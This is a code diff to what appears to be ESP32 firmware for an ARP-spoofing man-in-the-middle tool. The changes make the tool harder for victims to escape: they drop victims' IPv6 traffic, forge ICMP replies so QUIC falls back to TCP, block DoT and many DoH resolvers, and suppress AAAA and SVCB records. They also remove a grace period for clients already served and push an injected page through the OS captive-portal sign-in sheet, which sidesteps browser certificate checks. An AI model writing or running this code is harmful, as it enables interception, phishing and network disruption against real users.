@@ -1,3 +1,4 @@
+#include "core/dev/iram_patch.h"
 #if !defined(LITE_VERSION)
 
 /**
@@ -25,11 +26,13 @@
  */
 
 #include "net_spoof.h"
+#include "core/dev/tunables.h" // task 1: mitm.arp_restore_on_stop
 #include "net_spoof_cert.h"
 
 #include "core/wifi/wifi_common.h"
 #include "modules/wifi/wifi_atks.h"
 #include <esp_heap_caps.h>
+#include <esp_log.h>
 #include <globals.h>
 
 #include <WiFi.h>
@@ -132,6 +135,8 @@ static NetSpoofRule s_redirRules[NETSPOOF_MAX_RULES];
 static int s_redirCount = 0;
 static NetSpoofRule s_injectRules[NETSPOOF_MAX_RULES];
 static int s_injectCount = 0;
+/// HTML a captive-portal probe is answered with (the `portal` payload line).
+static String s_portalPage;
 
 static bool s_dnsActive = false;
 static bool s_httpActive = false;
@@ -153,6 +158,25 @@ static uint32_t s_httpInjected = 0;
 static uint32_t s_httpsRequests = 0;
 static uint32_t s_httpsRedirected = 0;
 static uint32_t s_httpsInjected = 0;
+// 1.4 transport-fallback telemetry. Written from the receive path (both cores)
+// as well as the service task; a counter is a statistic, so a lost increment
+// during a race is not a bug and an atomic would cost airtime for nothing.
+static volatile uint32_t s_quicDropped = 0;
+static volatile uint32_t s_dotDropped = 0;
+static volatile uint32_t s_svcbSuppressed = 0;
+static volatile uint32_t s_ipv6Dropped = 0;
+
+/// True while an MITM rule set is armed and the client must be kept on the
+/// IPv4/TCP path this engine can see.
+///
+/// Every suppression below used to test `s_httpActive || s_httpsActive` on its
+/// own. That leaves the classic DNS-only payload (`dns * <ip>`) exposed: a
+/// dual-stack client resolves over IPv6 and an HTTP/3 client streams over QUIC
+/// without ever asking for a page, so the engine sees `dns=0/0` while the phone
+/// happily loads the site. A DNS responder is a rule set too, so it arms the
+/// same barrier. Observe-only recon is deliberately excluded - it must stay
+/// invisible, which is why `s_observe` is not part of this.
+static bool _mitmFallbackGuard() { return s_httpActive || s_httpsActive || s_dnsActive; }
 
 // The capture ring is scratch data (the last eight intercepted frames) and used
 // to sit in .bss: eight entries of ~530 B = 4.2 KB of INTERNAL DRAM for the
@@ -427,7 +451,20 @@ static bool _txEth(
  * @param senderMac/senderIp the (possibly forged) ARP sender pair
  * @param targetMac/targetIp the ARP target pair
  */
-static bool _sendArp(
+// Task 1, phase 3: patchable slot mitm_build_frame. The ARP frame builder is
+// the hot path of a MITM run; the thunk keeps every call site on the hook.
+__attribute__((noinline)) static bool _sendArp(
+    const uint8_t ethDst[6], const uint8_t senderMac[6], const uint8_t senderIp[4],
+    const uint8_t targetMac[6], const uint8_t targetIp[4], uint16_t opcode, int repeat
+) {
+    return ((bool (*)(
+        const uint8_t *, const uint8_t *, const uint8_t *, const uint8_t *, const uint8_t *, uint16_t, int
+    ))vndPatchTarget(VND_SLOT_MITM_BUILD_FRAME))(
+        ethDst, senderMac, senderIp, targetMac, targetIp, opcode, repeat
+    );
+}
+
+__attribute__((noinline, used)) bool mitm_build_frame_body(
     const uint8_t ethDst[6], const uint8_t senderMac[6], const uint8_t senderIp[4],
     const uint8_t targetMac[6], const uint8_t targetIp[4], uint16_t opcode, int repeat
 ) {
@@ -1404,6 +1441,61 @@ static bool _sendRaRetire(const uint8_t *dstMac, const uint8_t *gwMac) {
     return _tx(frame, len);
 }
 
+/**
+ * @brief Tell a client that a dropped QUIC/DoQ datagram has no listener.
+ *
+ * A silent drop leaves the HTTP/3 client waiting for its own blackhole timer
+ * (Chrome's is seconds, and a media app can sit on it), so the TCP fallback is
+ * slow or never happens. An ICMPv4 destination-unreachable / port-unreachable
+ * is what a captive portal sends and makes the client retry over TCP at once.
+ *
+ * The quote is the original IP header plus the first 8 bytes (the UDP header),
+ * which is all RFC 792 asks for and all the client needs to match the flow. The
+ * source is this board: while the ARP pair is up the victim accepts frames from
+ * this MAC, and the message is a report about its own datagram, not a claim
+ * about the remote host.
+ *
+ * @param victimMac  the client the datagram came from
+ * @param victimIp   its IPv4 address (host order)
+ * @param ip         the original IPv4 header
+ * @param ihl        its header length in bytes
+ * @param totalIpLen the original IPv4 total length
+ */
+static bool _sendIcmpPortUnreachable(
+    const uint8_t *victimMac, uint32_t victimIp, const uint8_t *ip, uint16_t ihl, uint16_t totalIpLen
+) {
+    uint32_t myIp = (uint32_t)WiFi.localIP();
+    if (myIp == 0 || victimMac == NULL || ip == NULL || ihl < 20) return false;
+    uint16_t quote = (uint16_t)(ihl + 8); // IP header + first 8 bytes of the datagram
+    if (quote > totalIpLen) quote = totalIpLen;
+    uint16_t len = (uint16_t)(14 + 20 + 8 + quote);
+    if (len < 60) len = 60; // ethernet pads short frames
+    if (len > NETSPOOF_FRAME_MAX) return false;
+
+    uint8_t frame[NETSPOOF_FRAME_MAX];
+    memset(frame, 0, len);
+    memcpy(frame, victimMac, 6);
+    memcpy(frame + 6, s_myMac, 6);
+    _put16(frame + 12, 0x0800);
+
+    uint8_t *oip = frame + 14;
+    oip[0] = 0x45;                                  // version 4, 20-byte header
+    oip[8] = 64;                                    // TTL
+    oip[9] = 1;                                     // ICMP
+    _put16(oip + 2, (uint16_t)(20 + 8 + quote));    // total length
+    memcpy(oip + 12, &myIp, 4);                     // source: this board
+    memcpy(oip + 16, &victimIp, 4);                 // destination: the client
+    _put16(oip + 10, _finish16(_sum16(oip, 20, 0)));
+
+    uint8_t *icmp = oip + 20;
+    icmp[0] = 3; // destination unreachable
+    icmp[1] = 3; // port unreachable
+    memcpy(icmp + 8, ip, quote);
+    _put16(icmp + 2, _finish16(_sum16(icmp, (size_t)(8 + quote), 0)));
+
+    return _tx(frame, len);
+}
+
 /// True when a TLS ClientHello names a DNS-over-HTTPS endpoint.
 ///
 /// While traffic is bridged a DoH connection would simply succeed, and the
@@ -1416,6 +1508,12 @@ static bool _tlsLooksLikeDoh(const uint8_t *data, uint16_t len) {
         "cloudflare-dns.com", "dns.google", "nextdns.io", "doh.opendns.com",
         "dns.quad9.net",     "dns.adguard",  "dns.mullvad.net", "dns.alidns.com",
         "doh.pub",           "dns.pub",      "doh.360.cn",      "dns.google.com",
+        // DoH-first browsers (DuckDuckGo, Brave, ControlD, CleanBrowsing) keep
+        // their own resolver unless its endpoint is refused. Resetting these
+        // makes the browser fall back to the system resolver this engine answers.
+        "dns.duckduckgo.com", "doh.duckduckgo.com", "dns.brave.com", "doh.controld.com",
+        "doh.cleanbrowsing.org", "dns.sb", "doh.libredns.gr", "doh.opendns.com",
+        "dns.nextdns.io",     "doh.mullvad.net",   "dns.adguard-dns.com",
     };
     if (!data || len < 8) return false;
     for (size_t m = 0; m < sizeof(kMarkers) / sizeof(kMarkers[0]); m++) {
@@ -1506,6 +1604,21 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         }
     }
 
+    // IPv6 cannot be intercepted at all: DNS answers and the TLS endpoint live on
+    // IPv4. The RA in _buildRaRetire() asks the client to retire its IPv6 router
+    // and resolver, but that is advisory - a cached route, a stale advertisement
+    // or a DHCPv6 resolver keeps the client on IPv6, and every one of those flows
+    // bypasses this hook. While a guard is armed, drop the victim's IPv6 outright
+    // so the fallback is unconditional instead of a hope. Our own frames were
+    // already excluded above by source MAC, and the RA is TX, so it is unaffected.
+    if (etherType == 0x86DD) {
+        if (_mitmFallbackGuard()) {
+            s_ipv6Dropped++;
+            pbuf_free(p);
+            return ERR_OK;
+        }
+        return next ? next(p, inp) : ERR_OK;
+    }
     if (etherType != 0x0800) return next ? next(p, inp) : ERR_OK; // IPv4 only
 
     const uint8_t *ip = scratch + 14;
@@ -1559,7 +1672,14 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         // client fall back to TCP (TLS to the board) instead of silently
         // bypassing the redirect. The board's own traffic is already excluded
         // above by the source MAC.
-        if ((dstPort == 443 || dstPort == 853) && (s_httpActive || s_httpsActive)) {
+        if ((dstPort == 443 || dstPort == 853) && _mitmFallbackGuard()) {
+            // Say "no listener" instead of blackholing the datagram: that is
+            // what makes the client retry over TCP immediately rather than wait
+            // for its QUIC blackhole timer (and some media apps never retry at
+            // all after a silent drop).
+            uint16_t ipTotal = ((uint16_t)ip[2] << 8) | ip[3];
+            _sendIcmpPortUnreachable(scratch + 6, srcIp, ip, ihl, ipTotal);
+            s_quicDropped++;
             pbuf_free(p);
             return ERR_OK;
         }
@@ -1595,7 +1715,11 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         // DNS-over-TLS (TCP/853) is blocked while the engine runs: it would
         // resolve names behind this engine's back. Dropping it makes Android's
         // Private DNS and DoT clients fall back to the plain resolver.
-        if (dstPort == 853 && (s_httpActive || s_httpsActive)) {
+        if (dstPort == 853 && _mitmFallbackGuard()) {
+            // Android's Private DNS and any DoT client would resolve behind this
+            // engine's back; dropping the connection makes them fall back to the
+            // plain resolver, which is the one being intercepted.
+            s_dotDropped++;
             pbuf_free(p);
             return ERR_OK;
         }
@@ -2001,8 +2125,16 @@ static bool _dnsValueIp(const String &value, IPAddress &ip) {
         return netspoof_gateway_info(ip, mac);
     }
     if (v.equalsIgnoreCase("this") || v.equalsIgnoreCase("board")) {
-        if (!WiFi.isConnected()) return false;
-        ip = WiFi.localIP();
+        if (WiFi.isConnected()) {
+            ip = WiFi.localIP();
+            return true;
+        }
+        // No station link: a `.ucmitm` payload answers with its twin (`dns *
+        // this`) and the twin's AP address is the only address its clients can
+        // reach, so that is what `this` means there. 0.0.0.0 means no AP is up.
+        IPAddress ap = WiFi.softAPIP();
+        if ((uint32_t)ap == 0) return false;
+        ip = ap;
         return true;
     }
     return ip.fromString(v.c_str());
@@ -2065,63 +2197,6 @@ static bool _sendEmptyDns(NetSpoofSlot *slot, size_t qEnd) {
 }
 
 /// Handle one queued DNS query: match a rule and answer it.
-/// Clients that already received a redirect or a page.
-///
-/// After that, everything the client loads (the page it was redirected to, its
-/// scripts, the stream from another host) has to resolve for real, or every
-/// subresource would be pinned back to this board and the target could never
-/// finish loading. Entries expire, so a second site visited later is intercepted
-/// again.
-#define NETSPOOF_SERVED_MAX 32 // a 200-host run logs many distinct clients
-#define NETSPOOF_SERVED_MS 30000
-static struct {
-    uint8_t mac[6];
-    uint32_t ts;
-} s_served[NETSPOOF_SERVED_MAX];
-static int s_servedCount = 0;
-
-static void _markServed(const uint8_t *mac) {
-    if (_isZeroMac(mac)) return;
-    static int cursor = 0;
-    portENTER_CRITICAL(&s_fwdMux);
-    for (int i = 0; i < s_servedCount; i++) {
-        if (_sameMac(s_served[i].mac, mac)) {
-            s_served[i].ts = millis();
-            portEXIT_CRITICAL(&s_fwdMux);
-            return;
-        }
-    }
-    int slot = s_servedCount;
-    if (slot >= NETSPOOF_SERVED_MAX) {
-        slot = cursor;
-        cursor = (cursor + 1) % NETSPOOF_SERVED_MAX;
-    } else {
-        s_servedCount++;
-    }
-    memcpy(s_served[slot].mac, mac, 6);
-    s_served[slot].ts = millis();
-    portEXIT_CRITICAL(&s_fwdMux);
-}
-
-static bool _isServed(const uint8_t *mac) {
-    bool served = false;
-    uint32_t now = millis();
-    portENTER_CRITICAL(&s_fwdMux);
-    for (int i = 0; i < s_servedCount; i++) {
-        if (_sameMac(s_served[i].mac, mac) && (now - s_served[i].ts) < NETSPOOF_SERVED_MS) {
-            served = true;
-            break;
-        }
-    }
-    portEXIT_CRITICAL(&s_fwdMux);
-    return served;
-}
-
-static void _markServedIp(const IPAddress &ip) {
-    uint8_t mac[6];
-    if (_fwdPeerMac((uint32_t)ip, mac)) _markServed(mac);
-}
-
 /// True when a name must keep resolving for real while everything else is
 /// pinned to the board (the hosts a redirect points at).
 static bool _dnsPassMatch(const String &name) {
@@ -2203,11 +2278,13 @@ static void _handleDns(NetSpoofSlot *slot) {
         return;
     }
 
-    // A redirect target must stay reachable, and a client that has already been
-    // redirected must be able to load what it was sent to: both resolve for
-    // real. Everything else stays pinned to the board so it is intercepted.
-    bool passthrough =
-        (s_passCount > 0 && _dnsPassMatch(qname)) || (s_forwardActive && _isServed(slot->clientMac));
+    // Only the hosts a redirect actually points at resolve for real; they are
+    // registered as pass-through when the rule is added. Everything else stays
+    // pinned to the board for the whole run: the old per-client "already served"
+    // grace period switched that client's next lookups back to the real
+    // resolver, so the first page worked and every site visited after it
+    // bypassed the engine entirely.
+    bool passthrough = s_passCount > 0 && _dnsPassMatch(qname);
     if (qtype == 1 && passthrough) {
         IPAddress real;
         if (_resolveUpstream(qname, real)) {
@@ -2225,9 +2302,14 @@ static void _handleDns(NetSpoofSlot *slot) {
     }
 
     // Force the IPv4/TCP path while intercepting: no AAAA, no SVCB/HTTPS RR.
-    if ((qtype == 28 || qtype == 64 || qtype == 65) && (s_httpsActive || s_httpActive)) {
+    // AAAA/SVCB/HTTPS are suppressed whenever a guard is armed - including a
+    // DNS-only payload. A real AAAA sends the client over IPv6, which this engine
+    // cannot poison, and a real HTTPS RR hands it the h3 endpoint, which it
+    // cannot terminate. Both are exactly the bypass this release is about.
+    if ((qtype == 28 || qtype == 64 || qtype == 65) && _mitmFallbackGuard()) {
         size_t qEnd = _dnsQuestionEnd(slot->data, slot->copyLen);
         if (qEnd && _sendEmptyDns(slot, qEnd)) s_dnsAnswers++;
+        s_svcbSuppressed++;
         _capturePush(slot, "DNS", name, qtype == 28 ? "no AAAA" : "no SVCB", 1);
         return;
     }
@@ -2254,8 +2336,13 @@ static void _handleDns(NetSpoofSlot *slot) {
         return;
     }
 
+    // A pinned answer must not outlive the run: with a 300 s TTL the client kept
+    // the board's address in its DNS cache for five minutes after `mitm stop`,
+    // so the network looked dead long after ARP had been restored. Five seconds
+    // is long enough to cover one page load and short enough that the real
+    // resolver takes over immediately when the engine stops.
     size_t payloadLen = wifi_build_dns_response(
-        s_l4b, sizeof(s_l4b), txid, name, answer.toString().c_str(), 300
+        s_l4b, sizeof(s_l4b), txid, name, answer.toString().c_str(), 5
     );
     if (payloadLen == 0) return;
 
@@ -2479,24 +2566,32 @@ static void _handleHttp(NetSpoofSlot *slot) {
         return;
     }
 
-    // A captive-portal probe with a page rule armed: answer 302 to this board's
-    // root, which is where that page is served. The OS follows the Location in
-    // its own sign-in browser, so the page appears by itself and the redirect
-    // works on a phone that would never accept an HTTPS redirect.
-    bool probe = (d.inject >= 0) && _portalProbe(host, path);
+    // A captive-portal probe while any rule is armed. With a `portal` page this
+    // answers 200 + that HTML, so the OS sign-in sheet renders it directly; a
+    // plain redirect payload answers 302 to its own target. Either way the page
+    // appears without the user's browser or its certificate rules being involved.
+    bool probe = (d.inject >= 0 || d.redirect >= 0) && _portalProbe(host, path);
 
     // The response must fit one ethernet frame: 1514 - 14 eth - 20 ip - 20 tcp.
     const size_t kMaxPayload = 1450;
     size_t payloadLen;
     uint8_t action = 0;
     if (probe) {
-        String loc = "http://" + WiFi.localIP().toString() + "/";
-        payloadLen = _buildHttpResponse(
-            (char *)s_l4b, kMaxPayload, 302, "Found", "text/html; charset=utf-8", String(), loc
-        );
-        action = 1;
+        String body = netspoof_http_portal_page();
+        if (body.length()) {
+            payloadLen = _buildHttpResponse(
+                (char *)s_l4b, kMaxPayload, 200, "OK", "text/html; charset=utf-8", body, String()
+            );
+            action = 2;
+        } else {
+            String loc = d.redirect >= 0 ? d.location : ("http://" + WiFi.localIP().toString() + "/");
+            payloadLen = _buildHttpResponse(
+                (char *)s_l4b, kMaxPayload, 302, "Found", "text/html; charset=utf-8", String(), loc
+            );
+            action = 1;
+        }
         if (payloadLen) {
-            Serial.printf("[NETSPOOF] captive probe %s%s -> %s\n", host.c_str(), path.c_str(), loc.c_str());
+            Serial.printf("[NETSPOOF] captive probe %s%s\n", host.c_str(), path.c_str());
         }
     } else if (d.redirect >= 0) {
         // A long Location is trimmed: an over-long redirect is worse than a
@@ -2537,9 +2632,6 @@ static void _handleHttp(NetSpoofSlot *slot) {
         );
         if (action == 1) s_httpRedirected++;
         else s_httpInjected++;
-        // Remember the client: from now on its lookups resolve for real, so the
-        // page it was redirected to can actually load.
-        _markServed(slot->clientMac);
     }
     _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), sent ? action : 0);
 }
@@ -2837,6 +2929,12 @@ bool netspoof_dns_active() { return s_dnsActive; }
 uint32_t netspoof_dns_queries() { return s_dnsQueries; }
 uint32_t netspoof_dns_answers() { return s_dnsAnswers; }
 
+// Transport-fallback counters (1.4). See _mitmFallbackGuard().
+uint32_t netspoof_quic_dropped() { return s_quicDropped; }
+uint32_t netspoof_dot_dropped() { return s_dotDropped; }
+uint32_t netspoof_svcb_suppressed() { return s_svcbSuppressed; }
+uint32_t netspoof_ipv6_dropped() { return s_ipv6Dropped; }
+
 bool netspoof_dns_add_rule(const String &domain, const String &ip, bool wildcard, String &err) {
     IPAddress parsed;
     String value = ip;
@@ -3058,11 +3156,34 @@ bool netspoof_http_add_injection(const String &pattern, const String &html, bool
     return _httpAddRule(s_injectRules, s_injectCount, pattern, html, wildcard, err);
 }
 
+/// Arm the page that answers the OS captive-portal probe.
+///
+/// This is the modern-client route: every current phone decides "is this network
+/// captive?" with one plaintext request and then opens the answer in its own
+/// sign-in sheet. That sheet is not the browser the user launched, so an
+/// HTTPS-only browser (DuckDuckGo, an iPhone with a locked-down Safari) cannot
+/// refuse it and no certificate is involved.
+void netspoof_http_set_portal_page(const String &html) {
+    _ensure_mutex();
+    _lock();
+    s_portalPage = html;
+    _unlock();
+}
+
+String netspoof_http_portal_page() {
+    _ensure_mutex();
+    _lock();
+    String copy = s_portalPage;
+    _unlock();
+    return copy;
+}
+
 void netspoof_http_clear_rules() {
     _ensure_mutex();
     _lock();
     s_redirCount = 0;
     s_injectCount = 0;
+    s_portalPage = "";
     _unlock();
 }
 
@@ -3182,10 +3303,6 @@ static void _httpsPushCapture(
             }
         }
     }
-    // The client has been served: its next lookups (the target page and its
-    // assets) must resolve for real or the page it was sent to cannot load.
-    if (action && ipWire) _markServedIp(IPAddress(ipWire));
-
     String reqLine = String(method) + " " + path + " HTTP/1.1";
     _capturePushEx(
         NETSPOOF_CAPTURE_HTTPS, ipWire, macStr, method, host.c_str(), path.c_str(), reqLine.c_str(), action
@@ -3303,6 +3420,14 @@ bool netspoof_https_start(String &err) {
         return false;
     }
 
+    // A client that rejects the self-signed certificate aborts the handshake and
+    // retries, and esp_https_server logs every failed session at ERROR. That is
+    // expected here (the certificate is self-signed by design) and a busy client
+    // can emit dozens of those lines a second, flooding the console and the USB
+    // debug channel for the whole run. Mute that one tag while the endpoint is
+    // up; netspoof_https_stop() restores the default.
+    esp_log_level_set("esp_https_server", ESP_LOG_NONE);
+
     s_httpsActive = true;
     // The victim must be able to reach this endpoint, so the DNS responder has
     // to run even when the payload has no `dns` line. If it was already up,
@@ -3326,6 +3451,7 @@ bool netspoof_https_stop(String &err) {
     if (s_httpsServer) {
         httpd_ssl_stop(s_httpsServer);
         s_httpsServer = NULL;
+        esp_log_level_set("esp_https_server", ESP_LOG_ERROR);
     }
     bool was = s_httpsActive;
     s_httpsActive = false;
@@ -3380,7 +3506,10 @@ void netspoof_cleanup() {
     s_dnsActive = false;
     s_httpActive = false;
     _hookUninstall();
-    netspoof_arp_restore_all();
+    // Task 1 tunable `mitm.arp_restore_on_stop` (default 1 = the old behaviour).
+    // Off is a deliberate debugging choice that leaves the victims' ARP caches
+    // pointed at us after the run - never the default, because it strands hosts.
+    if (tuneGetByName("mitm.arp_restore_on_stop", nullptr)) netspoof_arp_restore_all();
     s_svcRun = false;
     // Let the service task notice and exit on its own; it owns its own handle.
     for (int i = 0; i < 20 && s_svcTask; i++) vTaskDelay(pdMS_TO_TICKS(10));
